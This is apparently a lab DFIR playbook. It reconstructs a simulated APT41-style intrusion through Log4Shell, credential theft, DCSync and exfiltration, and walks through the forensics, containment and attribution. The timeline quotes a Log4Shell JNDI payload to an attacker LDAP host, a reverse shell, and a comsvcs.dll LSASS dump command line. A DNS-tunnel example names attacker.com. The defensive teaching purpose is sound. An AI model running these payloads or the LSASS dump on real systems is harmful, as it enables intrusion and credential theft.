# DFIR Playbook — Operation DragonRx
## Full Incident Response: From Alert to Attribution

**Trigger:** Day 6 — SOC analyst escalates Day 4 LSASS alert (EID 10, Sysmon) after backlog review.
**Scope:** WEB01 (Ubuntu, initial access), WS01 (Windows 10, credential theft), DC01 (Windows Server 2019, DCSync + persistence).
**Objective:** Determine scope, timeline, attacker capability, and dwell time. Identify all persistence mechanisms.

---

> **Operation DragonRx series** · [CTI Report](apt41-dragonrx-cti-report.md) · [Lab Architecture](lab-architecture.md) · [Attack Playbook](attack-playbook.md) · [Detection Guide](detection-guide.md) · **DFIR Playbook** · [Malware Analysis](rxphage-malware.md)

## Table of Contents

1. [IR Phase 1: Triage and Scoping](#1-ir-phase-1-triage-and-scoping)
2. [IR Phase 2: Evidence Collection](#2-ir-phase-2-evidence-collection)
3. [Memory Forensics — Volatility3](#3-memory-forensics--volatility3)
4. [Disk Forensics — Timeline and Artifacts](#4-disk-forensics--timeline-and-artifacts)
5. [Network Forensics — PCAP and Zeek Log Analysis](#5-network-forensics--pcap-and-zeek-log-analysis)
6. [Log Analysis — Windows Event Logs and Sysmon](#6-log-analysis--windows-event-logs-and-sysmon)
7. [Malware Analysis in Context — RxPhage on Victim Host](#7-malware-analysis-in-context--rxphage-on-victim-host)
8. [Timeline Reconstruction](#8-timeline-reconstruction)
9. [Scope and Impact Assessment](#9-scope-and-impact-assessment)
10. [Containment and Eradication Checklist](#10-containment-and-eradication-checklist)
11. [Attribution Indicators](#11-attribution-indicators)
12. [Final Report Structure](#12-final-report-structure)

---

## 1. IR Phase 1: Triage and Scoping

**First 30 minutes — answer these questions without touching live hosts:**

```bash
# 1. What does Wazuh/Elastic show for the triggering alert?
# Navigate Kibana: http://localhost:5601 → Security → Alerts → sort by severity
# Filter: host.name:WS01 AND event.code:10 AND @timestamp:[2026-04-20 TO 2026-04-25]

# 2. How many hosts are involved?
# Kibana: Security → Network → filter by timeframe
# Query: event.code:(4624 OR 4625 OR 4662 OR 4769) AND winlog.event_data.IpAddress:192.168.10.100

# 3. Is the attacker still active?
# Zeek logs are inside the dragonrx_zeek Docker container
docker exec dragonrx_zeek tail -f /usr/local/zeek/logs/current/conn.log | grep "192.168.10.100"
# Check Sliver C2 sessions — if sessions exist, attacker has live access
docker exec -it dragonrx_c2 sliver  # → type 'sessions'

# 4. What's the earliest malicious event?
# Timeline first event
docker exec dragonrx_zeek grep "jndi:" /usr/local/zeek/logs/current/http.log | \
  head -1 | zeek-cut ts id.orig_h
# Convert epoch: date -d @$(echo "1713610800") — Day 1 14:23 UTC
```

**Scope decision:** WEB01, WS01, DC01 — all three hosts confirmed. FS01 (file server) flagged as likely accessed (crown jewel target), add to scope.

---

## 2. IR Phase 2: Evidence Collection

### 2.1 Memory Acquisition

```bash
# WEB01 (Linux) — using avml (Microsoft, kernel module approach)
# Install on victim host
wget https://github.com/microsoft/avml/releases/latest/download/avml -O /tmp/avml
chmod +x /tmp/avml
sudo /tmp/avml /tmp/web01_memory.lime

# Transfer to IR workstation (encrypted)
scp -P 22 analyst@192.168.10.100:/tmp/web01_memory.lime /dfir/evidence/web01/
sha256sum /dfir/evidence/web01/web01_memory.lime > /dfir/evidence/web01/web01_memory.lime.sha256

# WS01 (Windows) — WinPmem
# Download and run on WS01
.\winpmem_mini_x64_rc2.exe ws01_memory.raw
# Transfer via SMB to IR share
copy ws01_memory.raw \\IR-WORKSTATION\evidence\ws01\

# DC01 (Windows) — same WinPmem
.\winpmem_mini_x64_rc2.exe dc01_memory.raw
```

### 2.2 Disk Imaging

```bash
# WEB01 — live acquisition (do NOT power off — cron persistence visible in running state)
# Over network with dd + netcat
# On IR workstation (receiver):
nc -lvnp 9876 | dd of=/dfir/evidence/web01/web01_disk.img bs=4M status=progress

# On WEB01:
sudo dd if=/dev/sda bs=4M | nc 192.168.10.250 9876

# Windows VMs — use VSS snapshot then image (avoids VSS deletion)
# Create VSS snapshot before shutting down:
vssadmin create shadow /for=C:
# Identify shadow copy device: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX
# Image the shadow: 
.\RawCopy.exe /FileNamePath:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1 /OutputPath:\\IR-SHARE\evidence\ws01\

# After imaging: compute hashes for chain of custody
sha256sum /dfir/evidence/web01/web01_disk.img > web01_disk.img.sha256
md5sum  /dfir/evidence/web01/web01_disk.img > web01_disk.img.md5
```

### 2.3 Log Collection

```bash
# Windows event logs (preserve before attacker clears them)
# On each Windows host, collect:
wevtutil epl Security     C:\IR\logs\Security.evtx
wevtutil epl System       C:\IR\logs\System.evtx
wevtutil epl Application  C:\IR\logs\Application.evtx
wevtutil epl "Microsoft-Windows-Sysmon/Operational" C:\IR\logs\Sysmon.evtx
wevtutil epl "Microsoft-Windows-PowerShell/Operational" C:\IR\logs\PowerShell.evtx

# Linux logs from WEB01
# In the lab, WEB01 is a Docker container — collect via docker:
docker logs dragonrx_web01 > /dfir/evidence/host/web01_app.log 2>&1
docker exec dragonrx_web01 cat /proc/1/environ 2>/dev/null | tr '\0' '\n' > /dfir/evidence/host/web01_env.txt
# On a real host (narrative reference):
sudo tar czf /tmp/web01_logs.tar.gz \
  /var/log/auth.log* \
  /var/log/syslog* \
  /var/log/audit/ \
  /tmp/.cache/ \
  /etc/crontab \
  /var/spool/cron/ \
  2>/dev/null

# Network capture (if span port or tap available)
# Zeek runs in host network mode — logs at /usr/local/zeek/logs/current/ inside container
# Extract logs for offline analysis:
docker cp dragonrx_zeek:/usr/local/zeek/logs/current/. /dfir/evidence/network/zeek/
```

### 2.4 Volatile Data (Live Response — Before Memory Acquisition)

```bash
# Run on each live host via Velociraptor or manual
# Critical: collect BEFORE memory dump to capture network state

# WEB01
ss -antup > /tmp/live_netstat.txt
ps auxef > /tmp/live_processes.txt
ls -la /proc/*/exe 2>/dev/null | grep -v "No such" > /tmp/live_proc_exe.txt
cat /etc/crontab /var/spool/cron/crontabs/* > /tmp/live_cron.txt 2>/dev/null
find / -name "rxphage" -o -name ".cache" -type d 2>/dev/null > /tmp/live_suspicious_files.txt
last -w > /tmp/live_logins.txt
arp -an > /tmp/live_arp.txt

# Windows (WS01, DC01)
netstat -ano > C:\IR\volatile\netstat.txt
tasklist /v /fo csv > C:\IR\volatile\tasklist.csv
schtasks /query /fo csv > C:\IR\volatile\schtasks.csv
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run > C:\IR\volatile\run_keys.txt
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run >> C:\IR\volatile\run_keys.txt
net user /domain > C:\IR\volatile\domain_users.txt
net group "Domain Admins" /domain > C:\IR\volatile\da_group.txt
```

---

## 3. Memory Forensics — Volatility3

```bash
# Install Volatility3
pip3 install volatility3

# Alias for convenience
alias vol3="python3 /opt/volatility3/vol.py"

# Verify memory image
vol3 -f web01_memory.lime banners.Banners
# Expected: Linux kernel banner (Spring Boot container based on eclipse-temurin:11-jdk-jammy)

#==================================================
# LINUX MEMORY ANALYSIS — WEB01
#==================================================

# List all processes with parent relationships
vol3 -f web01_memory.lime linux.pslist
vol3 -f web01_memory.lime linux.pstree
# LOOK FOR: bash/sh with parent PID matching java (Tomcat)
# LOOK FOR: /tmp/.cache/rxphage running as www-data

# Network connections
vol3 -f web01_memory.lime linux.netstat
# LOOK FOR: established connections to 10.0.0.10:443 (C2)
# LOOK FOR: dnscat2 UDP connections on port 53

# Command history from memory
vol3 -f web01_memory.lime linux.bash
# Recovers bash history even if history -c was run!
# CRITICAL FINDING: shows exact commands attacker ran

# Dump suspicious process (rxphage) from memory
vol3 -f web01_memory.lime linux.pslist | grep rxphage
# Get PID, then dump:
vol3 -f web01_memory.lime linux.proc.dump --pid 1337 --dump-dir /dfir/dumps/web01/

# Find files in memory (including deleted)
vol3 -f web01_memory.lime linux.find_file --find "/tmp/.cache/rxphage"

# Check environment variables (may reveal attacker env setup)
vol3 -f web01_memory.lime linux.envars --pid 1337

# Kernel modules (rootkit check)
vol3 -f web01_memory.lime linux.lsmod
# Compare against known-good snapshot

#==================================================
# WINDOWS MEMORY ANALYSIS — WS01
#==================================================

vol3 -f ws01_memory.raw windows.info
# Confirm: Windows 10, x64

# Process list with DLLs
vol3 -f ws01_memory.raw windows.pslist
vol3 -f ws01_memory.raw windows.pstree
# LOOK FOR: java.exe → child processes (DLL sideloading = java.exe is parent)

# Detect injected code (malfind)
vol3 -f ws01_memory.raw windows.malfind
# Detects VAD regions with PAGE_EXECUTE_READWRITE + MZ header
# WILL FLAG: any process hollowing or injected shellcode

# Specific process: java.exe (sideloaded)
vol3 -f ws01_memory.raw windows.pslist | grep -i java
# Get PID, then examine DLLs:
vol3 -f ws01_memory.raw windows.dlllist --pid <JAVA_PID>
# LOOK FOR: jvm.dll loaded from C:\ProgramData\ (not C:\Program Files\)

# Network connections from memory
vol3 -f ws01_memory.raw windows.netstat
# LOOK FOR: java.exe ESTABLISHED to 10.0.0.10:443

# Registry hives in memory (recover run keys)
vol3 -f ws01_memory.raw windows.registry.hivelist
vol3 -f ws01_memory.raw windows.registry.printkey \
  --key "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# LSASS credential extraction from dump (for verification)
vol3 -f ws01_memory.raw windows.lsadump
# Shows cached credentials — confirms what attacker got

# Handles: what files is rxphage/java.exe accessing?
vol3 -f ws01_memory.raw windows.handles --pid <JAVA_PID> --object-type File

# Dump suspicious DLL from memory
vol3 -f ws01_memory.raw windows.dumpfiles --pid <JAVA_PID> \
  --dump-dir /dfir/dumps/ws01/
# Dumps all DLLs loaded by java.exe — jvm.dll dump = RxPhage loader for analysis
```

---

## 4. Disk Forensics — Timeline and Artifacts

### 4.1 Linux Disk Analysis (WEB01)

```bash
# Mount disk image (read-only!)
mkdir -p /mnt/web01
mount -o ro,loop,offset=$((512*2048)) /dfir/evidence/web01/web01_disk.img /mnt/web01

# Find newly created files (attacker activity window)
find /mnt/web01 -newer /mnt/web01/var/log/dpkg.log \
  -not -path "*/proc/*" -not -path "*/sys/*" \
  -ls 2>/dev/null | sort -k8,9 | tail -50

# Find JSP webshells (real Tomcat host)
find /mnt/web01/opt/tomcat/webapps/ -name "*.jsp" -ls 2>/dev/null
# Lab equivalent — check container filesystem:
docker exec dragonrx_web01 find / -name "*.jsp" 2>/dev/null

# Recover deleted files (rxphage was shredded — partial recovery possible)
# The shred command overwrites, but inodes/dir entries may remain
debugfs /dev/loop0 -R "lsdel" 2>/dev/null | head 20

# Cron analysis
cat /mnt/web01/var/spool/cron/crontabs/www-data 2>/dev/null
cat /mnt/web01/etc/crontab

# Auth logs — when did attacker get shell?
grep "bash\|sh " /mnt/web01/var/log/auth.log | grep -i "pts\|tty" | tail 50

# App access log — find the Log4Shell request
# Lab: web01 is a Docker container; logs go to stdout
docker logs dragonrx_web01 2>&1 | grep -i 'jndi\|X-Api-Version'
# Real Tomcat host equivalent:
# grep -i "jndi:" /mnt/web01/opt/tomcat/logs/localhost_access_log.*.txt
# Expected: "GET / HTTP/1.1" 200 with ${jndi:ldap://10.0.0.20:1389/Exploit} in X-Api-Version header
```

### 4.2 Windows Timeline with Plaso/log2timeline

```bash
# Create supertimeline from Windows disk image
log2timeline.py --storage-file ws01_timeline.plaso \
  --parsers "winreg,winevtx,mft,prefetch,lnk,pe,recycle_bin,srum" \
  /dfir/evidence/ws01/ws01_disk.img

# Filter timeline to attack window (Day 3-6)
psort.py -o dynamic \
  -w ws01_timeline.csv \
  ws01_timeline.plaso \
  "date > '2026-04-20 00:00:00' AND date < '2026-04-26 23:59:59'"

# Key timeline entries to look for:
grep -E "jvm.dll|rxphage|JavaUpdateService|lsass.dmp|7za.exe|data.zip" ws01_timeline.csv
```

### 4.3 Windows Artifact Analysis

```bash
# MFT (Master File Table) — file creation/modification timeline
python3 analyzeMFT.py -f /dfir/evidence/ws01/MFT -o mft_ws01.csv
grep -i "rxphage\|jvm\|JavaUpdate\|lsass.dmp\|data.zip" mft_ws01.csv

# Prefetch — what executed on this system?
# (Windows creates prefetch files for every executed binary)
python3 -m pip install libscca
python3 << 'EOF'
import glob
import scca

for pf in glob.glob('/dfir/evidence/ws01/Windows/Prefetch/*.pf'):
    try:
        f = scca.file()
        f.open(pf)
        print(f.executable_filename, f.get_last_run_time(0), f.run_count)
    except: pass
EOF
# LOOK FOR: RXPHAGE.EXE, 7ZA.EXE, PROCDUMP64.EXE, SHARPHOUND.EXE

# Windows Registry — persistence and attacker artifacts
# Using RegRipper
rip.pl -r /dfir/evidence/ws01/Windows/System32/config/SOFTWARE \
  -p run | grep -v "^#"
# LOOK FOR: JavaUpdateService pointing to ProgramData path

# Scheduled Tasks on disk
ls /dfir/evidence/ws01/Windows/System32/Tasks/
cat "/dfir/evidence/ws01/Windows/System32/Tasks/JavaUpdateService"
# XML content reveals: Command, User, Trigger (OnStart, SYSTEM)

# SRUM (System Resource Usage Monitor) — network activity by process
python3 << 'EOF'
# Use srum-dump or ese-analyst
import subprocess
result = subprocess.run(['python3', 'srum_dump.py',
    '-i', '/dfir/evidence/ws01/Windows/System32/sru/SRUDB.dat',
    '-t', 'network',
    '-o', 'srum_network.csv'], capture_output=True, text=True)
print(result.stdout[:2000])
EOF
# SRUM shows: java.exe sent X bytes to IP 10.0.0.10 — proves C2 exfil

# AmCache — installed software and execution evidence
rip.pl -r /dfir/evidence/ws01/Windows/AppCompat/Programs/Amcache.hve \
  -p amcache | grep -i "rxphage\|7za\|sharphound"

# LNK files — recently accessed files (may reveal what attacker opened)
python3 lnk_parser.py /dfir/evidence/ws01/Users/jsmith/AppData/Roaming/Microsoft/Windows/Recent/
```

### 4.4 FS01 — Data Exfil Evidence

```bash
# Mount FS01 image
mount -o ro,loop /dfir/evidence/fs01/fs01_disk.img /mnt/fs01

# Check share access logs (if enabled)
# Windows Security Event 5140: Network Share Access
# Windows Security Event 5145: Network Share Object Access
# These are in the event logs: fs01_security.evtx

# File access timestamps — when were research files accessed?
find /mnt/fs01/Research/ -name "*.xlsx" -ls | sort -k8,9
# Compare atime of files against known attacker window (Day 4-5)

# Look for staging artifacts
find /mnt/fs01/ -name "*.zip" -newer /mnt/fs01/Windows/System32/kernel32.dll -ls
```

---

## 5. Network Forensics — PCAP and Zeek Log Analysis

### 5.1 Reconstruct the Initial Exploit

```bash
# Extract the Log4Shell HTTP request from PCAP
tshark -r /dfir/network/capture.pcap \
  -Y "http" \
  -T fields \
  -e frame.time \
  -e ip.src \
  -e http.request.method \
  -e http.request.uri \
  -e http.request.line \
  | grep -i "jndi"

# Reconstruct JNDI callback in PCAP
tshark -r /dfir/network/capture.pcap \
  -Y "ip.addr == 10.0.0.20 && tcp.port == 1389" \
  -T fields -e frame.time -e ip.src -e ip.dst -e tcp.payload
```

### 5.2 Reconstruct C2 Beacon Pattern

```bash
# Extract all HTTPS connections to attacker C2 (10.0.0.10)
tshark -r /dfir/network/capture.pcap \
  -Y "ip.addr == 10.0.0.10 && tcp.port == 443" \
  -T fields -e frame.time -e ip.src -e ip.dst -e frame.len \
  > /dfir/analysis/c2_connections.txt

# Calculate beacon intervals
python3 << 'EOF'
import sys
from datetime import datetime

timestamps = []
with open('/dfir/analysis/c2_connections.txt') as f:
    for line in f:
        parts = line.strip().split('\t')
        if len(parts) >= 4:
            try:
                ts = datetime.strptime(parts[0][:19], "%Y-%m-%d %H:%M:%S")
                timestamps.append(ts)
            except: pass

timestamps.sort()
intervals = [(timestamps[i+1]-timestamps[i]).seconds for i in range(len(timestamps)-1)]
if intervals:
    print(f"Beacon count: {len(timestamps)}")
    print(f"Mean interval: {sum(intervals)/len(intervals):.1f}s")
    print(f"Min interval: {min(intervals)}s  Max: {max(intervals)}s")
    print(f"First beacon: {timestamps[0]}")
    print(f"Last beacon:  {timestamps[-1]}")
    # Expected: ~60-90s intervals, consistent with RxPhage SleepMin=30 SleepMax=120
EOF
```

### 5.3 Exfiltration Analysis

```bash
# Total data transferred from WS01/DC01 to attacker
tshark -r /dfir/network/capture.pcap \
  -Y "ip.src == 192.168.10.10 && ip.dst == 10.0.0.10" \
  -T fields -e frame.len | \
  awk '{sum+=$1} END {printf "Total exfil: %.2f MB\n", sum/1048576}'

# DNS tunneling reconstruction
tshark -r /dfir/network/capture.pcap \
  -Y "dns && ip.src == 192.168.10.100" \
  -T fields -e frame.time -e dns.qry.name \
  | grep -E "[a-zA-Z0-9+/]{20,}\." \
  | head 50

# Decode DNS tunnel payload (dnscat2 specific)
# Extract subdomains, base64 decode, reconstruct file
python3 << 'EOF'
import base64
import re

subdomains = []
# paste your dns query list here
queries = [
    "SGVsbG8gd29ybGQ=.attacker.com",  # example
]
for q in queries:
    sub = q.split('.')[0]
    try:
        decoded = base64.b64decode(sub + "==").decode('latin-1')
        print(repr(decoded[:50]))
    except: pass
EOF
```

---

## 6. Log Analysis — Windows Event Logs and Sysmon

```bash
# Parse Sysmon EVTX — find key events
python3 << 'EOF'
import sys
from evtx import PyEvtxParser

parser = PyEvtxParser("/dfir/evidence/ws01/IR/logs/Sysmon.evtx")
for record in parser.records_json():
    data = record['data']
    event_id = data.get('Event', {}).get('System', {}).get('EventID', 0)
    
    # EID 10: LSASS access
    if event_id == 10:
        event_data = data.get('Event', {}).get('EventData', {})
        target = event_data.get('TargetImage', '')
        if 'lsass' in target.lower():
            caller = event_data.get('SourceImage', '')
            granted = event_data.get('GrantedAccess', '')
            time = data['Event']['System']['TimeCreated']['#attributes']['SystemTime']
            print(f"[{time}] LSASS ACCESS: {caller} → {target} (access: {granted})")
    
    # EID 7: Unsigned DLL
    elif event_id == 7:
        event_data = data.get('Event', {}).get('EventData', {})
        signed = event_data.get('Signed', 'true')
        image_loaded = event_data.get('ImageLoaded', '')
        if signed == 'false' and 'ProgramData' in image_loaded:
            image = event_data.get('Image', '')
            time = data['Event']['System']['TimeCreated']['#attributes']['SystemTime']
            print(f"[{time}] UNSIGNED DLL: {image} loaded {image_loaded}")
    
    # EID 1: Process create
    elif event_id == 1:
        event_data = data.get('Event', {}).get('EventData', {})
        image = event_data.get('Image', '')
        parent = event_data.get('ParentImage', '')
        cmd = event_data.get('CommandLine', '')
        if 'comsvcs' in cmd.lower() or 'sekurlsa' in cmd.lower():
            time = data['Event']['System']['TimeCreated']['#attributes']['SystemTime']
            print(f"[{time}] SUSPICIOUS PROCESS: {parent} → {image}: {cmd}")
EOF

# Windows Security EID 4662 — DCSync
python3 << 'EOF'
from evtx import PyEvtxParser
REPL_GUID = "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"  # DS-Replication-Get-Changes-All

parser = PyEvtxParser("/dfir/evidence/dc01/IR/logs/Security.evtx")
for record in parser.records_json():
    data = record['data']
    if data.get('Event', {}).get('System', {}).get('EventID', 0) == 4662:
        event_data = data['Event'].get('EventData', {})
        props = str(event_data.get('Properties', ''))
        if REPL_GUID in props:
            subject = event_data.get('SubjectUserName', '')
            if not subject.endswith('$'):  # exclude machine accounts
                time = data['Event']['System']['TimeCreated']['#attributes']['SystemTime']
                print(f"[{time}] DCSYNC: {subject} requested DS-Replication-Get-Changes-All")
EOF
```

---

## 7. Malware Analysis in Context — RxPhage on Victim Host

### 7.1 Recover Malware Sample

```bash
# From memory dump (if shredded on disk)
# Volatility can dump process memory and reconstruct PE
vol3 -f web01_memory.lime linux.proc.dump --pid <RXPHAGE_PID> --dump-dir /dfir/samples/

# From Windows memory (DLL version)
vol3 -f ws01_memory.raw windows.dumpfiles \
  --virtaddr <RXPHAGE_DLL_BASE_ADDR> \
  --dump-dir /dfir/samples/
# Or by filename:
vol3 -f ws01_memory.raw windows.dumpfiles --physaddr $(
  vol3 -f ws01_memory.raw windows.handles --object-type File | grep jvm.dll | awk '{print $1}'
) --dump-dir /dfir/samples/

# Compute hash for IOC reporting
sha256sum /dfir/samples/*.exe /dfir/samples/*.dll /dfir/samples/*.elf
```

### 7.2 Quick Static Triage

```bash
cd /dfir/samples/

# File types
file *

# Hashes
sha256sum * | tee ioc_hashes.txt

# Strings — find what wasn't XOR-encoded
strings -n 8 rxphage.elf | grep -E "http|api|C2|beacon|config|go1\."

# Go symbol table extraction (goldmine)
strings rxphage.elf | grep -E "rxphage/|main\.|evasion\.|beacon\." | sort -u

# Check for compile-time paths (often reveals dev machine path)
strings rxphage.elf | grep -E "/home/|/Users/|C:\\\\Users\\\\|/root/"
# May reveal: /home/operator/projects/rxphage/ ← developer machine path

# Detect XOR encoding — look for short key
python3 << 'EOF'
with open('rxphage.elf', 'rb') as f:
    data = f.read()
# Test XOR key 0x4C
decoded = bytes(b ^ 0x4C for b in data[0x8000:0x9000])  # try .rdata section
print(decoded.decode('latin-1', errors='replace')[:200])
EOF
```

### 7.3 Config Extraction

```bash
# Find XOR-encoded config in binary
python3 << 'EOF'
with open('rxphage.elf', 'rb') as f:
    data = f.read()

# Search for XOR 0x4C pattern that decodes to JSON
import re

for i in range(0, len(data)-100, 4):
    chunk = bytes(b ^ 0x4C for b in data[i:i+100])
    try:
        text = chunk.decode('ascii')
        if '{"C2' in text or '"c2"' in text.lower() or '"host"' in text.lower():
            print(f"Found config at offset {hex(i)}")
            full_chunk = bytes(b ^ 0x4C for b in data[i:i+500])
            print(full_chunk.decode('ascii', errors='replace'))
            break
    except: pass
EOF

# Expected output:
# Found config at offset 0xXXXXX
# {"C2Primary":"updates.oracle-cdn.com","C2Port":443,"UserAgent":"Mozilla/5.0...Oracle/Java-Update/8.0.361","MutexName":"JavaUpdateMutex_v2","SleepMin":30,"SleepMax":120,"JitterPct":0.2,"CampaignID":"DRAGONRX-2024-001"}
```

### 7.4 Dynamic Analysis Recap (from simulation)

```
Process: rxphage.exe (PID: 4892)
Parent: java.exe (PID: 2048) — sideloading confirmed

Network activity observed:
  Outbound TCP 192.168.10.50:49832 → 10.0.0.10:443 [ESTABLISHED]
  POST /api/v2/telemetry every 67 ± 12 seconds
  
Files created:
  C:\ProgramData\Oracle\Java\javapath\jvm.dll (malicious)
  C:\Temp\lsass.dmp (credential dump)
  C:\Temp\data.zip (staged exfil)
  
Registry modified:
  HKLM\SYSTEM\CurrentControlSet\Services\JavaUpdateService (scheduled task backed by registry)
  
Mutex created:
  Global\JavaUpdateMutex_v2
```

---

## 8. Timeline Reconstruction

Full attack timeline reconstructed from logs, memory, disk, and network evidence:

```
2026-04-20 14:23:07  [Zeek/http.log] Log4Shell JNDI payload in X-Api-Version header
                     src: 10.0.0.5 → dst: 192.168.10.100:8080
                     Payload: ${jndi:ldap://10.0.0.20:1389/Exploit}

2026-04-20 14:23:09  [Zeek/conn.log] JNDI callback: 192.168.10.100 → 10.0.0.20:1389

2026-04-20 14:23:11  [web01 app log] Exploit class fetched: 10.0.0.20:8080/Exploit.class

2026-04-20 14:23:12  [Zeek/conn.log] Reverse shell: 192.168.10.100:XXXXX → 10.0.0.5:4444

2026-04-20 14:24:01  [MFT/WEB01] File created: /tmp/cache.jsp (webshell in writable path)

2026-04-20 14:31:55  [MFT/WEB01] File created: /tmp/.cache/rxphage (implant deployed)

2026-04-20 14:32:10  [Zeek/conn.log] First RxPhage beacon: 192.168.10.100:XXXXX → 10.0.0.10:443

2026-04-21 09:15:33  [Zeek/conn.log] Network scan: 192.168.10.100 scanning .1-.254 port 445

2026-04-21 11:45:02  [Zeek/dns.log] LDAP queries: 192.168.10.100 → 192.168.10.10 (DC01)

2026-04-22 16:30:17  [Windows EID 4624/DC01] NTLM LogonType=3 from 192.168.10.100 to WS01
                     User: jsmith — Pass-the-Hash or plaintext auth

2026-04-23 08:00:44  [Windows EID 4769/DC01] RC4 TGS requested for svc_backup
                     Requestor: svc_ldap — Kerberoasting

2026-04-23 10:15:22  [Sysmon EID 10/WS01] LSASS accessed by rundll32.exe
                     GrantedAccess: 0x1FFFFF (full read)
                     CommandLine: rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 864 lsass.dmp full

2026-04-23 13:00:01  [Windows EID 4662/DC01] DS-Replication-Get-Changes-All
                     Subject: Administrator (from 192.168.10.50 — WS01)
                     DCSync executed → all NTLM hashes stolen

2026-04-24 02:00:15  [Sysmon EID 7/DC01] jvm.dll loaded by java.exe
                     Path: C:\ProgramData\Oracle\Java\javapath\jvm.dll
                     Signed: false

2026-04-24 02:05:33  [Windows EID 4698/DC01] Scheduled task created: JavaUpdateService
                     Action: C:\ProgramData\Oracle\Java\javapath\java.exe
                     Trigger: AtStartup, User: SYSTEM

2026-04-24 03:30:42  [Zeek/dns.log] High-entropy DNS subdomains to tunnel.attacker-infra.com
                     DNS tunnel active (backup exfil channel)

2026-04-24 04:00:00  [MFT/DC01] C:\Temp\data.zip created (2.31 GB — staged research data)

2026-04-24 04:00:01  [Zeek/conn.log] Large HTTPS uploads: DC01 → 10.0.0.10:443 (exfiltration)
                     Total transferred: 2.31 GB over 47 minutes

2026-04-25 08:00:00  [SOC] Analyst reviews Day 4 LSASS alert — incident declared

DWELL TIME: 4 days 17 hours 36 minutes (April 20 14:23 → April 25 08:00)
```

---

## 9. Scope and Impact Assessment

```
Hosts Confirmed Compromised:
  [X] WEB01 (192.168.10.100) — initial access, webshell, implant, Linux pivot point
  [X] WS01  (192.168.10.50)  — lateral movement, LSASS dump, data staging
  [X] DC01  (192.168.10.10)  — DCSync, persistence (sideloading), exfil source
  [X] FS01  (192.168.10.20)  — crown jewel data accessed (SMB mount from DC01)

Credentials Compromised:
  [X] svc_ldap   — plaintext from container environment variables (LDAP_USER/LDAP_PASS)
  [X] svc_backup — cracked from Kerberoast hash  
  [X] jsmith     — LSASS dump / PTH
  [X] Administrator (domain) — DCSync  
  [X] krbtgt     — DCSync (Golden Ticket risk — must reset twice, 10hr apart)

Data Exfiltrated:
  Volume:    2.31 GB
  Content:   Clinical trial Phase III data (Research share)
             Synthesis process documentation (Manufacturing share)
  Method:    HTTPS C2 (primary) + DNS tunnel (secondary)
  Duration:  47 minutes (04:00 – 04:47 UTC, April 24)

Persistence Mechanisms Found:
  WEB01:    /tmp/.cache/rxphage + cron @reboot
  WEB01:    /tmp/cache.jsp (webshell in writable temp path)
  DC01:     C:\ProgramData\Oracle\Java\javapath\jvm.dll (DLL sideloading)
  DC01:     Scheduled Task "JavaUpdateService" (SYSTEM, OnStart)
```

---

## 10. Containment and Eradication Checklist

```
IMMEDIATE CONTAINMENT (within 1 hour of declaration):
  [ ] Isolate WEB01 from external network (firewall rule: block 10.0.0.0/24 inbound)
  [ ] Isolate WS01, DC01 from internet (block all egress except approved)
  [ ] Block C2 IPs at perimeter firewall: 10.0.0.10, 10.0.0.5
  [ ] Block C2 domains at DNS: updates.oracle-cdn.com, telemetry.java-services.net
  [ ] Reset krbtgt password TWICE (10-hour gap) — invalidates Golden Ticket risk
  [ ] Reset all compromised accounts: Administrator, jsmith, svc_ldap, svc_backup
  [ ] Disable compromised accounts temporarily

ERADICATION (within 24 hours):
  [ ] Remove webshell: /tmp/cache.jsp (or equivalent path in www-data writable dirs)
  [ ] Remove implant: /tmp/.cache/rxphage (verify with file hash)
  [ ] Remove cron entry on WEB01
  [ ] Remove jvm.dll from C:\ProgramData\Oracle\Java\javapath\
  [ ] Delete scheduled task: JavaUpdateService
  [ ] Patch Log4j: upgrade to 2.17.1+ on all Java apps
  [ ] Patch Log4j on all apps: upgrade to 2.17.1+ (primary fix; JVM flags are mitigations only)
  [ ] Remove svc_ldap credentials from container environment (use secrets manager / vault)

RECOVERY:
  [ ] Rebuild WEB01 from known-good image (or restore from pre-incident snapshot)
  [ ] Rebuild WS01 from known-good image
  [ ] Consider rebuilding DC01 (DCSync = domain fully compromised; safest = rebuild)
  [ ] Restore FS01 data from backup (verify backup integrity predates compromise)
  [ ] Notify legal/compliance of data exfil (Phase III clinical data = regulatory event)
  [ ] Notify affected research subjects if PII involved

POST-INCIDENT (within 7 days):
  [ ] Conduct full Active Directory security review (BloodHound audit)
  [ ] Implement privileged access workstations (PAW) for DA accounts
  [ ] Enable Protected Users security group for DA accounts
  [ ] Implement LDAP signing + channel binding
  [ ] Enable Credential Guard on all workstations
  [ ] Remove svc_backup from Backup Operators (over-privileged)
  [ ] Implement network segmentation: web tier cannot reach DC directly
  [ ] Deploy EDR on all hosts (current: Sysmon only, no behavioral EDR)
```

---

## 11. Attribution Indicators

**Observed in this incident vs. known APT41 patterns:**

| Indicator | This Incident | Known APT41 | Confidence |
|-----------|-------------|-------------|------------|
| Log4Shell within hours of PoC | Day 0 exploit | APT41 exploited Log4Shell within 24h (CISA AA22-011A) | High |
| Dual exfil channels (HTTPS + DNS) | Yes | Observed in KEYPLUG operations | Medium |
| DLL sideloading on DC | jvm.dll / java.exe | Classic PlugX technique | High |
| Custom Go implant | RxPhage | KEYPLUG (Go), other APT41 Go tools | Medium |
| Pharmaceutical target | NovaTech Pharma | COVID-19 IP theft 2020 (COVID-themed) | Medium |
| Campaign naming convention | DRAGONRX-2024-001 | APT41 uses internal campaign IDs | Low |
| Long dwell, quiet exfil | 4.7 days | APT41 avg dwell ~14 days (Mandiant) | Medium |

**Attribution assessment:** Moderate-confidence APT41 cluster. TTP alignment is strong (Log4Shell timing, DLL sideloading, dual C2). Insufficient technical evidence for individual attribution to specific MSS contractor without additional signals (infrastructure overlap, code similarity to confirmed APT41 samples).

---

## 12. Final Report Structure

```
IR Report: Incident #IR-2026-042 — NovaTech Pharma Intrusion

1. Executive Summary (1 page)
   - Attacker obtained unauthorized access to pharmaceutical research data
   - 2.31 GB of Phase III clinical trial data exfiltrated
   - Dwell time: 4 days 17 hours
   - All persistence mechanisms eradicated
   - Attribution: moderate confidence APT41 cluster

2. Incident Timeline (table)
   - From first exploit to containment

3. Technical Findings
   3.1 Initial Access — Log4Shell on patient portal
   3.2 Lateral Movement — credential theft and AD compromise
   3.3 Exfiltration — data staged and transferred
